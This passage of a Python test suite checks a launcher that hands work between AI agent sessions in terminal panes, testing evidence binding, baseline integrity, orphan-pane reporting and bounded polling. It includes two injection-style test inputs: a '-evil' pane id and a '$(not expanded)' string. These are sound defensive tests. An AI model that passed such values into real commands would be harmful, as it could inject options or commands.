        """A send that fails here is the worst case available: the guard is armed but the
        successor has no work. Retiring the predecessor now would strand the whole run."""
        calls = []

        def runner(argv, timeout=180):
            calls.append(argv)
            if argv[:3] == ["herdr", "pane", "split"]:
                return FakeProc(0, SPLIT_OK)
            if argv[:3] == ["herdr", "pane", "get"]:
                return FakeProc(0, PANE_GET_OK)
            if argv[:4] == ["herdr", "pane", "send-text", "w1:pZZ"] and argv[4] == RESUME_PROMPT:
                return FakeProc(1)
            return FakeProc(0)

        out = ll.perform_handoff(runner=runner, **_handoff())
        assert out["ok"] is False and out["failed_step"] == "send_resume_prompt"
        assert not any(c[:3] == ["herdr", "pane", "close"] and c[3] == "w1:p1" for c in calls)


# ---------------------------------------------------------------------------
# #611 Step-11 High 1 — typed launch modes, not caller-supplied claude args
# ---------------------------------------------------------------------------

class TestLaunchModes:
    def test_fresh_carries_no_claude_args(self) -> None:
        assert ll.claude_args_for_launch_mode("fresh") == []
        argv = ll.build_agent_start_argv(name="child4", pane="w1:pZZ",
                                         claude_args=ll.claude_args_for_launch_mode("fresh"))
        assert "--" not in argv and "--continue" not in argv

    def test_resume_mode_was_removed_not_merely_discouraged(self) -> None:
        """#611 Step-11 pass-4 High 1. A resumed successor can already own a registry row and an
        unmet goal row, so its evidence is temporal, never causally bound to THIS handoff.
        #569's contract is a FRESH successor with no `--resume`, so the mode was never needed —
        deleting it removes the whole stale-evidence class rather than documenting around it."""
        assert "resume" not in ll.LAUNCH_MODES
        with pytest.raises(ll.LauncherError):
            ll.claude_args_for_launch_mode("resume")

    @pytest.mark.parametrize("bad", ["", None, "FRESH", "--permission-mode", "print", 7,
                                     "resume"])
    def test_an_unknown_launch_mode_is_refused(self, bad) -> None:
        with pytest.raises(ll.LauncherError):
            ll.claude_args_for_launch_mode(bad)

    def test_fresh_mode_never_reloads_the_predecessor_transcript(self) -> None:
        """`fresh_session_available` only advertises fresh mode for a launcher that positively
        supports a NO-`--resume` launch (driver_lib Step-11 F1). A `fresh` handoff that quietly
        passed `--continue` would defeat exactly that."""
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        ll.perform_handoff(runner=r, **_handoff(launch_mode="fresh"))
        start = [c for c in r.calls if c[:3] == ["herdr", "agent", "start"]][0]
        assert "--continue" not in start and "--resume" not in start


# ---------------------------------------------------------------------------
# #611 Step-11 Medium 4 — the evidence must be FRESH and launch-bound
# ---------------------------------------------------------------------------

class TestEvidenceIsLaunchBound:
    """`--continue`/`--resume` mean the successor can carry a session id that ALREADY owns a
    registry row and an unmet goal row. Reading the whole file would then authorise teardown on
    the predecessor's own history."""

    def test_a_pre_launch_registry_row_does_not_count(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(
            read_text=Artifacts(registry_pre=REGISTRY_OK, registry="")))
        assert out["ok"] is False and out["failed_step"] == "project_switched"
        assert not _predecessor_closed(r)

    def test_a_pre_launch_goal_row_does_not_count(self) -> None:
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(
            read_text=Artifacts(transcript_pre=TRANSCRIPT_OK, transcript="")))
        assert out["ok"] is False and out["failed_step"] == "goal_armed"
        assert not _predecessor_closed(r)

    def test_history_before_the_launch_does_not_hide_a_real_new_row(self) -> None:
        """The offset must not be so blunt that a busy artifact never passes."""
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(
            read_text=Artifacts(registry_pre='{"session_id":"older"}\n',
                                transcript_pre='{"unrelated":1}\n')))
        assert out["ok"] is True, out

    def test_a_goal_row_for_a_DIFFERENT_condition_does_not_count(self) -> None:
        """Launch-binding by content: the armed guard must be the one we sent, not any unmet
        goal that happens to be in the transcript."""
        other = json.dumps({"attachment": {"type": "goal_status", "met": False,
                                           "sentinel": True, "condition": "someone else's run"}})
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(read_text=Artifacts(transcript=other)))
        assert out["ok"] is False and out["failed_step"] == "goal_armed"

    def test_a_truncated_condition_is_matched_in_its_TRUNCATED_form(self) -> None:
        """A capped goal arms the truncated text, so that is what the transcript will carry.
        Matching against the original would fail forever and teardown could never fire."""
        long_condition = "y" * 5000
        armed, truncated = ll.armed_condition(long_condition)
        assert truncated is True and len(armed) < len(long_condition)
        row = json.dumps({"attachment": {"type": "goal_status", "met": False,
                                         "condition": armed}})
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(
            goal_condition=long_condition, read_text=Artifacts(transcript=row)))
        assert out["ok"] is True, out
        assert out["truncated"] is True

    def test_a_missing_artifact_pre_launch_is_offset_zero_not_a_crash(self) -> None:
        """The successor's transcript genuinely does not exist before it is spawned, so the
        offset capture must treat 'unreadable' as 'nothing here yet' — not abort the handoff."""
        arts = Artifacts()
        seen = {"transcript": 0}

        def reader(path):
            if path == REGISTRY_PATH:
                return arts(path)
            seen["transcript"] += 1
            if seen["transcript"] == 1:
                raise FileNotFoundError("no such file")
            return TRANSCRIPT_OK

        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(read_text=reader))
        assert out["ok"] is True, out


class TestBaselineIntegrity:
    """#611 Step-11 pass-3 High 1. The previous revision mapped EVERY `OSError` to offset 0, so
    an artifact that exists but is momentarily unreadable was treated as empty — and the whole
    pre-existing file then counted as this launch's evidence."""

    def test_an_unreadable_registry_refuses_the_handoff(self) -> None:
        def reader(path):
            if path == REGISTRY_PATH:
                raise PermissionError("locked")
            return TRANSCRIPT_OK

        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(read_text=reader))
        assert out["ok"] is False and out["failed_step"] == "registry_baseline_unreadable"
        assert r.calls == [] or not any(c[:3] == ["herdr", "pane", "split"] for c in r.calls), \
            "no baseline means no launch — nothing should have been created"

    def test_an_unreadable_successor_transcript_refuses_after_the_split(self) -> None:
        arts = Artifacts()

        def reader(path):
            if path == REGISTRY_PATH:
                return arts(path)
            raise PermissionError("locked")

        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(read_text=reader))
        assert out["ok"] is False and out["failed_step"] == "transcript_baseline_unreadable"
        assert out["cleanup"] and "closed tentative pane" in out["cleanup"]
        assert not _predecessor_closed(r)

    def test_a_missing_file_is_still_offset_zero_not_a_refusal(self) -> None:
        """`FileNotFoundError` is the ONE case where 'unreadable' honestly means 'empty'."""
        assert ll._baseline(_raise(FileNotFoundError("nope")), "/x") == (0, ll._digest(""))
        assert ll._baseline(_raise(PermissionError("locked")), "/x") is None
        assert ll._baseline(_raise(UnicodeDecodeError("utf-8", b"\xf0", 0, 1, "x")), "/x") is None
        assert ll._baseline(lambda _p: "abcd", "/x") == (4, ll._digest("abcd"))

    def test_a_shrunken_artifact_voids_the_baseline(self) -> None:
        """Rotation or truncation makes the offset point somewhere else entirely, so positional
        evidence is meaningless — it must fail, not compare against the wrong region."""
        assert ll._tail("short", (100, ll._digest("x" * 100))) is None
        assert ll._tail("abcdef", (3, ll._digest("abc"))) == "def"

    def test_a_same_length_replacement_voids_the_baseline(self) -> None:
        """#611 Step-11 pass-4 High 1: length alone cannot see a file REPLACED at the same or a
        greater length — and `registry_prune.py` legitimately rewrites the registry wholesale
        via `os.replace`. The prefix digest is what notices."""
        assert ll._tail("XXXdef", (3, ll._digest("abc"))) is None
        assert ll._tail("abcdef", (3, ll._digest("abc"))) == "def"

    def test_a_replaced_registry_does_not_authorize_teardown(self) -> None:
        reads = {"n": 0}
        arts = Artifacts()

        def reader(path):
            if path != REGISTRY_PATH:
                return arts(path)
            reads["n"] += 1
            # baseline is one history; a concurrent prune then replaces the whole file with a
            # LONGER one that happens to carry the successor's id
            return "old-history\n" if reads["n"] == 1 else "pruned-and-rebuilt\n" + REGISTRY_OK

        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(read_text=reader))
        assert out["ok"] is False and out["failed_step"] == "project_switched"
        assert not _predecessor_closed(r)

    def test_a_rotated_registry_does_not_authorize_teardown(self) -> None:
        reads = {"n": 0}

        arts = Artifacts()

        def reader(path):
            if path != REGISTRY_PATH:
                return arts(path)
            reads["n"] += 1
            # a long history at baseline, then the file is rotated to a short new one that
            # happens to contain the successor's id
            return "x" * 500 if reads["n"] == 1 else REGISTRY_OK

        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(read_text=reader))
        assert out["ok"] is False and out["failed_step"] == "project_switched"
        assert not _predecessor_closed(r)


class TestUncertainSplitReporting:
    """#611 Step-11 pass-3 Medium 3 and pass-4 High 3. herdr can CREATE a pane and still fail
    to describe it, so the leak must be SURFACED — but it must never be guessed at. Pass 3
    closed the single new pane in the inventory diff; pass 4 showed that is unsound, because
    cardinality is not attribution: if our split created nothing and an unrelated session split
    concurrently, that one new pane is someone else's live session."""

    def _runner(self, split_stdout, split_rc=0, before=("w1:p1",), after=("w1:p1", "w1:pNEW")):
        listings = [json.dumps({"result": {"panes": [{"pane_id": p} for p in before]}}),
                    json.dumps({"result": {"panes": [{"pane_id": p} for p in after]}})]

        def runner(argv, timeout=180):
            runner.calls.append(list(argv))
            if argv[:3] == ["herdr", "pane", "list"]:
                return FakeProc(0, listings.pop(0) if listings else listings_last(listings))
            if argv[:3] == ["herdr", "pane", "split"]:
                return FakeProc(split_rc, split_stdout)
            return FakeProc(0)

        def listings_last(_l):
            return json.dumps({"result": {"panes": [{"pane_id": p} for p in after]}})

        runner.calls = []
        return runner

    @pytest.mark.parametrize("stdout,rc,step", [
        ("not json", 0, "split_response_unparseable"),
        ("", 1, "split"),
    ])
    def test_a_pane_that_appeared_is_reported_and_NEVER_closed(self, stdout, rc, step) -> None:
        r = self._runner(stdout, split_rc=rc)
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["failed_step"] == step
        assert out["cleanup"] and "POSSIBLE ORPHAN" in out["cleanup"]
        assert "w1:pNEW" in out["cleanup"], "the operator must be told which pane to check"
        assert not any(c[:3] == ["herdr", "pane", "close"] for c in r.calls), \
            "ownership is unprovable here — closing ANY pane risks killing a live session"

    def test_a_concurrent_foreign_pane_is_not_closed(self) -> None:
        """The pass-4 finding in its exact shape: our split creates nothing, an unrelated
        session splits between the two inventories, and the diff is exactly one pane. Pass 3
        would have closed it."""
        r = self._runner("not json", after=("w1:p1", "w1:pSOMEONE_ELSE"))
        out = ll.perform_handoff(runner=r, **_handoff())
        assert not any(c[:3] == ["herdr", "pane", "close"] for c in r.calls)
        assert out["cleanup"] and "w1:pSOMEONE_ELSE" in out["cleanup"]

    def test_nothing_created_means_nothing_to_report(self) -> None:
        r = self._runner("not json", after=("w1:p1",))
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["cleanup"] is None
        assert not any(c[:3] == ["herdr", "pane", "close"] for c in r.calls)

    def test_no_inventory_is_reported_not_guessed(self) -> None:
        def runner(argv, timeout=180):
            if argv[:3] == ["herdr", "pane", "list"]:
                return FakeProc(1)
            if argv[:3] == ["herdr", "pane", "split"]:
                return FakeProc(0, "not json")
            return FakeProc(0)

        out = ll.perform_handoff(runner=runner, **_handoff())
        assert out["cleanup"] and "cannot tell whether one leaked" in out["cleanup"]

    def test_a_split_TIMEOUT_after_creation_still_reports(self) -> None:
        """#611 Step-11 pass-4 Medium 4: the split used to run OUTSIDE the ownership
        try/finally, so a client timeout after herdr had already created the pane skipped
        cleanup entirely."""
        listings = [json.dumps({"result": {"panes": [{"pane_id": "w1:p1"}]}}),
                    json.dumps({"result": {"panes": [{"pane_id": p}
                                                     for p in ("w1:p1", "w1:pNEW")]}})]

        def runner(argv, timeout=180):
            if argv[:3] == ["herdr", "pane", "list"]:
                return FakeProc(0, listings.pop(0) if listings else listings[-1:] and "")
            if argv[:3] == ["herdr", "pane", "split"]:
                raise subprocess.TimeoutExpired(cmd="herdr", timeout=180)
            return FakeProc(0)

        out = ll.perform_handoff(runner=runner, **_handoff())
        assert out["ok"] is False
        assert out["cleanup"] and "POSSIBLE ORPHAN" in out["cleanup"]

    @pytest.mark.parametrize("returned", ["w1:p1", "w1:pEXISTING"])
    def test_a_returned_id_that_is_not_new_is_never_closed(self, returned) -> None:
        """#611 Step-11 pass-5 High 1: a well-formed response is not proof of ownership. If
        herdr returned the anchor, or an id that already existed, closing it would kill a live
        pane — possibly the predecessor itself, the exact outcome report-only exists to avoid."""
        r = self._runner(json.dumps({"result": {"pane_id": returned}}),
                         before=("w1:p1", "w1:pEXISTING"),
                         after=("w1:p1", "w1:pEXISTING"))
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is False and out["failed_step"] == "split_response_not_new"
        assert out["new_pane"] is None, "an unprovable id must not be claimed as ours"
        assert not any(c[:3] == ["herdr", "pane", "close"] for c in r.calls)

    def test_an_invalid_returned_pane_id_still_reports(self) -> None:
        """A pane id that parses but fails validation left `new_pane` unset, so the `finally`
        saw nothing to clean up (pass-4 Medium 4, second half)."""
        r = self._runner(json.dumps({"result": {"pane_id": "-evil"}}))
        out = ll.perform_handoff(runner=r, **_handoff())
        assert out["ok"] is False
        assert out["cleanup"] and "POSSIBLE ORPHAN" in out["cleanup"]
        assert not any(c[:3] == ["herdr", "pane", "close"] for c in r.calls)


class TestBoundedPolling:
    """The second revision read each artifact ONCE, immediately after `send-keys`, giving the
    hooks no time to write. That is a race whose losing side retires nothing and stalls the run."""

    def test_an_artifact_that_appears_late_is_still_found(self) -> None:
        slept: list[float] = []
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(
            read_text=Artifacts(appear_after=3), sleeper=slept.append))
        assert out["ok"] is True, out
        assert slept, "polling must actually wait between reads"

    def test_polling_is_bounded_and_fails_closed(self) -> None:
        slept: list[float] = []
        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(
            read_text=Artifacts(transcript=""), sleeper=slept.append))
        assert out["ok"] is False and out["failed_step"] == "goal_armed"
        assert len(slept) <= ll.GOAL_POLL_ATTEMPTS, "polling must be bounded"
        assert not _predecessor_closed(r)

    def test_a_partial_multibyte_read_is_retried_not_fatal(self) -> None:
        """`UnicodeDecodeError` is a ValueError, so catching OSError alone let a read that
        landed mid-character escape the poll and kill the handoff (pass-3 Low 5)."""
        state = {"n": 0}
        arts = Artifacts()

        def flaky(path):
            state["n"] += 1
            if state["n"] == 3:
                raise UnicodeDecodeError("utf-8", b"\xf0\x9f", 0, 2, "truncated")
            return arts(path)

        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(read_text=flaky, sleeper=lambda _s: None))
        assert out["ok"] is True, out

    def test_a_read_error_mid_poll_does_not_abort_the_poll(self) -> None:
        state = {"n": 0}
        arts = Artifacts()

        def flaky(path):
            state["n"] += 1
            if state["n"] == 3:
                raise OSError("transient")
            return arts(path)

        r = Runner({"herdr pane split": SPLIT_OK, "herdr pane get": PANE_GET_OK})
        out = ll.perform_handoff(runner=r, **_handoff(read_text=flaky, sleeper=lambda _s: None))
        assert out["ok"] is True, out


# ---------------------------------------------------------------------------
# AC6 — the condition is read VERBATIM from the predecessor's own transcript
# ---------------------------------------------------------------------------

class TestVerbatimConditionExtraction:
    def test_the_last_unmet_condition_is_returned_verbatim(self) -> None:
        assert ll.last_unmet_goal_condition(TRANSCRIPT_OK) == GOAL_CONDITION

    def test_the_LAST_unmet_row_wins_not_the_first(self) -> None:
        rows = "\n".join(json.dumps(
            {"attachment": {"type": "goal_status", "met": False, "condition": c}})
            for c in ("first goal", "second goal"))
        assert ll.last_unmet_goal_condition(rows) == "second goal"

    def test_a_met_goal_is_not_a_condition_to_re_arm(self) -> None:
        met = json.dumps({"attachment": {"type": "goal_status", "met": True,
                                         "condition": "already done"}})
        assert ll.last_unmet_goal_condition(met) is None

    def test_absent_or_unparseable_yields_none_never_a_guess(self) -> None:
        for text in ("", "garbage\n", '{"goal_status":{"met":false}}'):
            assert ll.last_unmet_goal_condition(text) is None

    def test_a_multiline_condition_survives_verbatim(self) -> None:
        cond = "line one\nline two\n  - a bullet with `backticks` and $(not expanded)"
        row = json.dumps({"attachment": {"type": "goal_status", "met": False,
                                         "condition": cond}})
        assert ll.last_unmet_goal_condition(row) == cond
